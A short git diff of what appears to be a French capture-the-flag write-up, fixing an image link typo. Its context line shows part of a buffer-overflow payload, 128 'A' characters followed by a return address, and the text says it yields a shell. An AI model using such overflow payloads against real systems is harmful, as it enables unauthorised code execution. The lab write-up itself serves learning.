@@ -55,6 +55,6 @@ Le nouveau payload devient alors ```(python -c "print('A'*128+'\x16\x85\x04\x08'
 
 Il n'y a plus qu'à exécuter et ...
 
-![Screenshot](./assets/images/exploit_ch15.png00?raw=true)
+![Screenshot](./assets/images/exploit_ch15.png?raw=true)
 
 Tadaa ! Le shell parle de lui-même :) 
